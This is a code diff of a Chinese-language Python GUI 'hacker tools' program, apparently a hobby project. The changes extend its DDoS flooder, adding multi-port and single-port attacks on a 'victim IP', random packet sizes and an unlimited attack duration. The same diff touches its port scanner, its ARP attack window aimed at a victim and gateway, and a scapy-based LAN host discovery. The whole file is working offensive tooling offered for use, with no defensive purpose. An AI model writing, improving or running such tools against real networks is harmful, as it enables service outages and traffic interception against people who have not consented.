@@ -56,15 +56,15 @@ except socket.error:
 
 # 创建主窗口
 root_main = tk.Tk()
-root_main.title("LakeV0.2")
+root_main.title("LakeV0.25 :)")
 root_main.geometry("300x200")
 
 # ddos窗口
 def open_ddos_window():
     global ddos_size_1_random
     root_ddos = tk.Toplevel(root_main)
-    root_ddos.geometry("710x400")
-    root_ddos.title("ddos V2.0")
+    root_ddos.geometry("760x400")
+    root_ddos.title("ddos V2.5")
     def portscanner(host, port):
         global openNum,open_port
         try:
@@ -118,13 +118,12 @@ def open_ddos_window():
             global ddos_thread_open_1
             sent = 0
             if ddos_size_1_random:
-                temp = size.split("~")
-                s = int(temp[0])
-                b = int(temp[1])
+                s = int(ddos_size_free_min_1.get())
+                b = int(ddos_size_free_max_1.get())
             while True:
                 if ddos_thread_open_1:
-                    if ddos_time_1.get()!="":
-                        if time.time()-begin_time>=int(ddos_time_1.get()):
+                    if ddos_time_choose_1.get()=="2":
+                        if time.time()-begin_time>=int(ddos_time_reg_1.get()):
                             ddos_thread_open_1 = False
                     try:
                         if ddos_size_1_random:
@@ -144,13 +143,12 @@ def open_ddos_window():
             global ddos_thread_open_2
             sent = 0
             if ddos_size_2_random:
-                temp = size.split("~")
-                s = int(temp[0])
-                b = int(temp[1])
+                s = int(ddos_size_free_min_2.get())
+                b = int(ddos_size_free_max_2.get())
             while True:
                 if ddos_thread_open_2:
-                    if ddos_time_2.get()!="":
-                        if time.time()-begin_time>=int(ddos_time_2.get()):
+                    if ddos_time_choose_2.get()=="2":
+                        if time.time()-begin_time>=int(ddos_time_reg_2.get()):
                             ddos_thread_open_2 = False
                     try:
                         if ddos_size_2_random:
@@ -178,24 +176,33 @@ def open_ddos_window():
         global ddos_thread_open_1,ddos_size_1_random
         def start():
             for port in ddos_port_list:
-                ddos(ddos_victimIP_1.get(),int(port),int(ddos_sd_1.get()),int(ddos_thread_1.get()),ddos_size_1.get(),1)
-        if ddos_sd_1.get()!="" and 0<int(ddos_sd_1.get())<=1000:
-            if fint(ddos_thread_1.get()):
-                if "~" in ddos_size_1.get():
-                    ddos_size_1_random = True
-                    ddos_thread_open_1 = True
-                    threading.Thread(target=start).start()
-                else:
-                    ddos_size_1_random = False
-                    if fint(ddos_size_2.get()):
-                        ddos_thread_open_1 = True
-                        threading.Thread(target=start).start()
+                ddos(ddos_victimIP_1.get(),int(port),int(ddos_sd_1.get()),int(ddos_thread_1.get()),ddos_size_reg_2.get(),1)
+        if ddos_victimIP_1.get()!="":
+            if ddos_sd_1.get()!="" and 0<int(ddos_sd_1.get())<=1000:
+                if fint(ddos_thread_1.get()):
+                    if ddos_size_choose_1.get()=="2":
+                        if fint(ddos_size_input_free_min_1.get()) and fint(ddos_size_input_free_max_1.get()):
+                            if int(ddos_size_input_free_min_1.get()) < int(ddos_size_input_free_max_1.get()):
+                                ddos_size_1_random = True
+                                ddos_thread_open_1 = True
+                                threading.Thread(target=start).start()
+                            else:
+                                error("第一个数要小于第二个数",root_ddos)
+                        else:
+                            error("请输入整数数据包",root_ddos)
                     else:
-                        error("请输入整数数据包",root_ddos)
+                        ddos_size_1_random = False
+                        if fint(ddos_size_reg_1.get()):
+                            ddos_thread_open_1 = True
+                            threading.Thread(target=start).start()
+                        else:
+                            error("请输入整数数据包",root_ddos)
+                else:
+                    error("请输入整数线程",root_ddos)
             else:
-                error("请输入整数线程",root_ddos)
+                error("请输入整数速度（要小于等于1000和大于等于1）",root_ddos)
         else:
-            error("请输入整数速度（要小于等于1000和大于等于1）",root_ddos)
+            error("请导入ddos文件",root_ddos)
     def close_ddos_1():
         global ddos_thread_open_1
         ddos_thread_open_1 = False
@@ -203,18 +210,24 @@ def open_ddos_window():
     def start_ddos_2():
         global ddos_thread_open_2,ddos_size_2_random
         def start():
-            ddos(ddos_victimIP_2.get(),int(ddos_port_2.get()),int(ddos_sd_2.get()),int(ddos_thread_2.get()),ddos_size_2.get(),2)
+            ddos(ddos_victimIP_2.get(),int(ddos_port_2.get()),int(ddos_sd_2.get()),int(ddos_thread_2.get()),ddos_size_reg_2.get(),2)
         if ddos_victimIP_2.get()!="":
             if fint(ddos_port_2.get()):
                 if ddos_sd_2.get()!="" and 0<int(ddos_sd_2.get())<=1000:
                     if fint(ddos_thread_2.get()):
-                        if "~" in ddos_size_2.get():
-                            ddos_size_2_random = True
-                            ddos_thread_open_2 = True
-                            threading.Thread(target=start).start()
+                        if ddos_size_choose_2.get()=="2":
+                            if fint(ddos_size_input_free_min_2.get()) and fint(ddos_size_input_free_max_2.get()):
+                                if int(ddos_size_input_free_min_2.get()) < int(ddos_size_input_free_max_2.get()):
+                                    ddos_size_2_random = True
+                                    ddos_thread_open_2 = True
+                                    threading.Thread(target=start).start()
+                                else:
+                                    error("第一个数要小于第二个数",root_ddos)
+                            else:
+                                error("请输入整数数据包",root_ddos)
                         else:
                             ddos_size_2_random = False
-                            if fint(ddos_size_2.get()):
+                            if fint(ddos_size_reg_2.get()):
                                 ddos_thread_open_2 = True
                                 threading.Thread(target=start).start()
                             else:
@@ -235,7 +248,7 @@ def open_ddos_window():
         global nmap_open
         if nmap_open==False:
             if nmap_victimIP.get()!="":
-                if nmap_thread.get()=="":
+                if nmap_thread_choose.get()=="1":
                     nmap_open = True
                     nmap_main(nmap_victimIP.get())
                 elif fint(nmap_thread.get()):
@@ -273,30 +286,78 @@ def open_ddos_window():
                 num+=1
             ddos_victimIP_1.set(temp[0])
             ddos_port_1.set(f"共有 {num} 个端口")
+    def nmap_max_thread():
+        nmap_thread_free_text.place_forget()
+        nmap_thread_free_input.place_forget()
+    def nmap_free_thread():
+        nmap_thread_free_text.place(x=460,y=90)
+        nmap_thread_free_input.place(x=520,y=90)
+    def ddos_max_size_2():
+        ddos_size_input_reg_2.place(x=300,y=180)
+        ddos_size_input_free_toshow_2.place_forget()
+        ddos_size_input_free_min_2.place_forget()
+        ddos_size_input_free_max_2.place_forget()
+    def ddos_free_size_2():
+        ddos_size_input_reg_2.place_forget()
+        ddos_size_input_free_toshow_2.place(x=350,y=180)
+        ddos_size_input_free_min_2.place(x=300,y=180)
+        ddos_size_input_free_max_2.place(x=370,y=180)
+    def ddos_max_time_2():
+        ddos_time_reg_input_2.place_forget()
+    def ddos_free_time_2():
+        ddos_time_reg_input_2.place(x=300,y=240)
+    def ddos_max_size_1():
+        ddos_size_input_reg_1.place(x=70,y=180)
+        ddos_size_input_free_toshow_1.place_forget()
+        ddos_size_input_free_min_1.place_forget()
+        ddos_size_input_free_max_1.place_forget()
+    def ddos_free_size_1():
+        ddos_size_input_reg_1.place_forget()
+        ddos_size_input_free_toshow_1.place(x=120,y=180)
+        ddos_size_input_free_min_1.place(x=70,y=180)
+        ddos_size_input_free_max_1.place(x=140,y=180)
+    def ddos_max_time_1():
+        ddos_time_reg_input_1.place_forget()
+    def ddos_free_time_1():
+        ddos_time_reg_input_1.place(x=70,y=240)
 
     ddos_victimIP_1 = tk.StringVar()
     ddos_port_1 = tk.StringVar()
     ddos_sd_1 = tk.StringVar()
     ddos_thread_1 = tk.StringVar()
     ddos_thread_1.set("1")
-    ddos_size_1 = tk.StringVar()
-    ddos_size_1.set("1490")
-    ddos_time_1 = tk.StringVar()
+    ddos_size_reg_1 = tk.StringVar()
+    ddos_size_reg_1.set("1490")
+    ddos_time_reg_1 = tk.StringVar()
+    ddos_size_choose_1 = tk.StringVar()
+    ddos_size_choose_1.set("1")
+    ddos_size_free_min_1 = tk.StringVar()
+    ddos_size_free_max_1 = tk.StringVar()
+    ddos_time_choose_1 = tk.StringVar()
+    ddos_time_choose_1.set("1")
 
     ddos_victimIP_2 = tk.StringVar()
     ddos_sd_2 = tk.StringVar()
     ddos_thread_2 = tk.StringVar()
     ddos_thread_2.set("1")
-    ddos_size_2 = tk.StringVar()
-    ddos_size_2.set("1490")
+    ddos_size_reg_2 = tk.StringVar()
+    ddos_size_reg_2.set("1490")
     ddos_port_2  = tk.StringVar()
-    ddos_time_2 = tk.StringVar()
+    ddos_time_reg_2 = tk.StringVar()
+    ddos_size_choose_2 = tk.StringVar()
+    ddos_size_choose_2.set("1")
+    ddos_size_free_min_2 = tk.StringVar()
+    ddos_size_free_max_2 = tk.StringVar()
+    ddos_time_choose_2 = tk.StringVar()
+    ddos_time_choose_2.set("1")
 
     nmap_victimIP = tk.StringVar()
     nmap_thread = tk.StringVar()
     nmap_jd = tk.StringVar()
     nmap_end = tk.StringVar()
     nmap_end.set(f"扫描结果：共有{openNum}个端口开放")
+    nmap_thread_choose = tk.StringVar()
+    nmap_thread_choose.set("1")
 
     tk.Label(root_ddos,text="多端口ddos").place(x=90,y=0)
     tk.Label(root_ddos,text="受害者IP：").place(x=0,y=30)
@@ -307,57 +368,82 @@ def open_ddos_window():
     tk.Entry(root_ddos,textvariable=ddos_sd_1).place(x=70,y=90)
     tk.Label(root_ddos,text="线程：    ").place(x=0,y=120)
     tk.Entry(root_ddos,textvariable=ddos_thread_1).place(x=70,y=120)
-    tk.Label(root_ddos,text="数据包大小：").place(x=0,y=150)
-    tk.Entry(root_ddos,textvariable=ddos_size_1,width=15).place(x=70,y=150)
-    tk.Label(root_ddos,text="字节").place(x=185,y=150)
-    tk.Label(root_ddos,text="攻击时长：").place(x=0,y=180)
-    tk.Entry(root_ddos,textvariable=ddos_time_1,width=15).place(x=70,y=180)
-    tk.Label(root_ddos,text="秒").place(x=185,y=180)
-    tk.Button(root_ddos,text="导入文件",command=open_file).place(x=0,y=210)
-    tk.Button(root_ddos,text="开始攻击",command=start_ddos_1).place(x=70,y=210)
-    tk.Button(root_ddos,text="停止攻击",command=close_ddos_1).place(x=140,y=210)
-    tk.Label(root_ddos,text="数据包大小可使用 \"114514~1919810\" 实现随机数据包大小").place(x=0,y=240)
+    tk.Radiobutton(root_ddos,text="固定数据包大小",variable=ddos_size_choose_1,value="1",command=ddos_max_size_1).place(x=0,y=150)
+    tk.Radiobutton(root_ddos,text="自定义数据包大小",variable=ddos_size_choose_1,value="2",command=ddos_free_size_1).place(x=110,y=150)
+    tk.Label(root_ddos,text="数据包大小：").place(x=0,y=180)
+    ddos_size_input_reg_1 = tk.Entry(root_ddos,textvariable=ddos_size_reg_1,width=16)
+    ddos_size_input_reg_1.place(x=70,y=180)
+    ddos_size_input_free_toshow_1 = tk.Label(root_ddos,text="~")
+    ddos_size_input_free_min_1 = tk.Entry(root_ddos,textvariable=ddos_size_free_min_1,width=6)
+    ddos_size_input_free_max_1 = tk.Entry(root_ddos,textvariable=ddos_size_free_max_1,width=6)
+    tk.Label(root_ddos,text="字节").place(x=190,y=180)
+    tk.Radiobutton(root_ddos,text="无限攻击时长",variable=ddos_time_choose_2,value="1",command=ddos_max_time_2).place(x=230,y=210)
+    tk.Radiobutton(root_ddos,text="自定义攻击时长",variable=ddos_time_choose_2,value="2",command=ddos_free_time_2).place(x=340,y=210)
+    tk.Label(root_ddos,text="攻击时长：").place(x=230,y=240)
+    tk.Label(root_ddos,text="无限").place(x=300,y=240)
+    ddos_time_reg_input_2 = tk.Entry(root_ddos,textvariable=ddos_time_reg_2,width=16)
+    tk.Label(root_ddos,text="秒").place(x=420,y=240)
+    tk.Radiobutton(root_ddos,text="无限攻击时长",variable=ddos_time_choose_1,value="1",command=ddos_max_time_1).place(x=0,y=210)
+    tk.Radiobutton(root_ddos,text="自定义攻击时长",variable=ddos_time_choose_1,value="2",command=ddos_free_time_1).place(x=110,y=210)
+    tk.Label(root_ddos,text="攻击时长：").place(x=0,y=240)
+    tk.Label(root_ddos,text="无限").place(x=70,y=240)
+    ddos_time_reg_input_1 = tk.Entry(root_ddos,textvariable=ddos_time_reg_1,width=16)
+    tk.Label(root_ddos,text="秒").place(x=190,y=240)
+    tk.Button(root_ddos,text="导入文件",command=open_file).place(x=0,y=270)
+    tk.Button(root_ddos,text="开始攻击",command=start_ddos_1).place(x=70,y=270)
+    tk.Button(root_ddos,text="停止攻击",command=close_ddos_1).place(x=140,y=270)
 
-    tk.Label(root_ddos,text="单端口ddos").place(x=320,y=0)
-    tk.Label(root_ddos,text="受害者IP：").place(x=220,y=30)
-    tk.Entry(root_ddos,textvariable=ddos_victimIP_2).place(x=290,y=30)
-    tk.Label(root_ddos,text="端口：").place(x=220,y=60)
-    tk.Entry(root_ddos,textvariable=ddos_port_2).place(x=290,y=60)
-    tk.Label(root_ddos,text="速度：    ").place(x=220,y=90)
-    tk.Entry(root_ddos,textvariable=ddos_sd_2).place(x=290,y=90)
-    tk.Label(root_ddos,text="线程：    ").place(x=220,y=120)
-    tk.Entry(root_ddos,textvariable=ddos_thread_2).place(x=290,y=120)
-    tk.Label(root_ddos,text="数据包大小：").place(x=220,y=150)
-    tk.Entry(root_ddos,textvariable=ddos_size_2,width=15).place(x=290,y=150)
-    tk.Label(root_ddos,text="字节").place(x=405,y=150)
-    tk.Label(root_ddos,text="攻击时长：").place(x=220,y=180)
-    tk.Entry(root_ddos,textvariable=ddos_time_2,width=15).place(x=290,y=180)
-    tk.Label(root_ddos,text="秒").place(x=405,y=180)
-    tk.Button(root_ddos,text="开始攻击",command=start_ddos_2).place(x=250,y=210)
-    tk.Button(root_ddos,text="停止攻击",command=close_ddos_2).place(x=330,y=210)
+    tk.Label(root_ddos,text="单端口ddos").place(x=330,y=0)
+    tk.Label(root_ddos,text="受害者IP：").place(x=230,y=30)
+    tk.Entry(root_ddos,textvariable=ddos_victimIP_2).place(x=300,y=30)
+    tk.Label(root_ddos,text="端口：").place(x=230,y=60)
+    tk.Entry(root_ddos,textvariable=ddos_port_2).place(x=300,y=60)
+    tk.Label(root_ddos,text="速度：    ").place(x=230,y=90)
+    tk.Entry(root_ddos,textvariable=ddos_sd_2).place(x=300,y=90)
+    tk.Label(root_ddos,text="线程：    ").place(x=230,y=120)
+    tk.Entry(root_ddos,textvariable=ddos_thread_2).place(x=300,y=120)
+    tk.Radiobutton(root_ddos,text="固定数据包大小",variable=ddos_size_choose_2,value="1",command=ddos_max_size_2).place(x=230,y=150)
+    tk.Radiobutton(root_ddos,text="自定义数据包大小",variable=ddos_size_choose_2,value="2",command=ddos_free_size_2).place(x=340,y=150)
+    tk.Label(root_ddos,text="数据包大小：").place(x=230,y=180)
+    ddos_size_input_reg_2 = tk.Entry(root_ddos,textvariable=ddos_size_reg_2,width=16)
+    ddos_size_input_reg_2.place(x=300,y=180)
+    ddos_size_input_free_toshow_2 = tk.Label(root_ddos,text="~")
+    ddos_size_input_free_min_2 = tk.Entry(root_ddos,textvariable=ddos_size_free_min_2,width=6)
+    ddos_size_input_free_max_2 = tk.Entry(root_ddos,textvariable=ddos_size_free_max_2,width=6)
+    tk.Label(root_ddos,text="字节").place(x=420,y=180)
+    tk.Radiobutton(root_ddos,text="无限攻击时长",variable=ddos_time_choose_2,value="1",command=ddos_max_time_2).place(x=230,y=210)
+    tk.Radiobutton(root_ddos,text="自定义攻击时长",variable=ddos_time_choose_2,value="2",command=ddos_free_time_2).place(x=340,y=210)
+    tk.Label(root_ddos,text="攻击时长：").place(x=230,y=240)
+    tk.Label(root_ddos,text="无限").place(x=300,y=240)
+    ddos_time_reg_input_2 = tk.Entry(root_ddos,textvariable=ddos_time_reg_2,width=16)
+    tk.Label(root_ddos,text="秒").place(x=420,y=240)
+    tk.Button(root_ddos,text="开始攻击",command=start_ddos_2).place(x=260,y=270)
+    tk.Button(root_ddos,text="停止攻击",command=close_ddos_2).place(x=340,y=270)
 
-    tk.Label(root_ddos,text="端口扫描").place(x=550,y=0)
-    tk.Label(root_ddos,text="受害者IP：").place(x=440,y=30)
-    tk.Entry(root_ddos,textvariable=nmap_victimIP).place(x=500,y=30)
-    tk.Label(root_ddos,text="扫描线程：").place(x=440,y=60)
-    tk.Entry(root_ddos,textvariable=nmap_thread).place(x=500,y=60)
-    tk.Button(root_ddos,text="开始扫描",command=nmap).place(x=440,y=90)
-    tk.Button(root_ddos,text="停止扫描",command=close_nmap).place(x=510,y=90)
-    tk.Label(root_ddos,text="扫描进度：").place(x=440,y=120)
-    tk.Label(root_ddos,textvariable=nmap_jd).place(x=500,y=120)
-    j=tkinter.ttk.Progressbar(root_ddos,length=250)
-    j.place(x=450,y=150)
+    tk.Label(root_ddos,text="端口扫描").place(x=570,y=0)
+    tk.Label(root_ddos,text="受害者IP：").place(x=460,y=30)
+    tk.Entry(root_ddos,textvariable=nmap_victimIP).place(x=520,y=30)
+    tk.Radiobutton(root_ddos,text="最大线程",variable=nmap_thread_choose,value="1",command=nmap_max_thread).place(x=460,y=60)
+    tk.Radiobutton(root_ddos,text="自定义线程",variable=nmap_thread_choose,value="2",command=nmap_free_thread).place(x=560,y=60)
+    nmap_thread_free_text = tk.Label(root_ddos,text="扫描线程：")
+    nmap_thread_free_input = tk.Entry(root_ddos,textvariable=nmap_thread)
+    tk.Button(root_ddos,text="开始扫描",command=nmap).place(x=460,y=120)
+    tk.Button(root_ddos,text="停止扫描",command=close_nmap).place(x=530,y=120)
+    tk.Label(root_ddos,text="扫描进度：").place(x=460,y=150)
+    tk.Label(root_ddos,textvariable=nmap_jd).place(x=520,y=150)
+    j=tkinter.ttk.Progressbar(root_ddos,length=280)
+    j.place(x=470,y=180)
     j['maximum']=100
     j['value']=0
-    tk.Label(root_ddos,textvariable=nmap_end).place(x=440,y=180)
-    tk.Button(root_ddos,text="导出ddos文件",command=save_file).place(x=580,y=90)
+    tk.Label(root_ddos,textvariable=nmap_end).place(x=460,y=210)
+    tk.Button(root_ddos,text="导出ddos文件",command=save_file).place(x=600,y=120)
 
     root_ddos.mainloop()
 
 # arp窗口
 def open_arp_window():
     root_arp = tk.Toplevel(root_main)
-    root_arp.title("arpV0.1")
+    root_arp.title("arpV0.2")
     root_arp.geometry("400x300")
 
     def arp(victimIP, gatewayIP, sleep):
@@ -459,10 +545,11 @@ def open_arp_window():
     tk.Button(root_arp,text="生成全部IP地址",command=make_allipfile).place(x=230,y=0)
 
     root_arp.mainloop()
+
 # 查看同局域网的活主机窗口
 def open_findip_window():
     root_findip = tk.Toplevel(root_main)
-    root_findip.title("查看同局域网的活主机V0.1")
+    root_findip.title("查看同局域网的活主机V0.15")
     root_findip.geometry("400x300")
 
     ip_showing = tk.StringVar()
@@ -473,32 +560,16 @@ def open_findip_window():
         def start():
             global findip_ok
             try:
-                def ping(host):
-                    ping_cmd = f"ping -n 1 {host}" if platform.system().lower() == "windows" else f"ping -c 1 {host}"
-                    try:
-                        output = subprocess.check_output(ping_cmd, shell=True, universal_newlines=True)
-                        if "TTL=" in output:
-                            return True
-                    except subprocess.CalledProcessError:
-                        pass
-                    return False
-                def scan_host(ip, active_hosts):
-                    if ping(ip):
-                        active_hosts.append(ip)
-                ip_parts = ip.split('.')
-                ip_prefix = '.'.join(ip_parts[:-1])
-                active_hosts = []
-                threads = []
-                for i in range(1, 256):
-                    ip_t = ip_prefix + '.' + str(i)
-                    thread = threading.Thread(target=scan_host, args=(ip_t, active_hosts))
-                    thread.start()
-                    threads.append(thread)
-                for thread in threads:
-                    thread.join()
+                arp = ARP(pdst=ip+"/24")
+                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+                packet = ether/arp
+                result = srp(packet, timeout=3, verbose=0)[0]
+                hosts = []
+                for sent, received in result:
+                    hosts.append(received.psrc)
                 s = ""
-                for i in range(len(active_hosts)):
-                    s += active_hosts[i]+"\n"
+                for i in range(len(hosts)):
+                    s += hosts[i]+"\n"
                 findip_ok = True
                 ip_show.set(s)
                 ip_showing.set("扫描完毕")
@@ -521,6 +592,7 @@ def open_findip_window():
     tk.Label(root_findip,textvariable=ip_show).place(x=0,y=30)
     tk.Label(root_findip,textvariable=ip_showing).place(x=250,y=0)
     tk.Button(root_findip,text="导出IP地址",command=save_ipfile).place(x=0,y=0)
+    tk.Label(root_findip,text="最好进行多次扫描之后再导出ip").place(x=170,y=30)
     root_findip.mainloop()
 tk.Label(root_main,text="Lake Hacker Tools 给你一个黑客的世界").place(x=0,y=0)
 tk.Button(root_main,text="ddos",command=open_ddos_window).place(x=0,y=30)
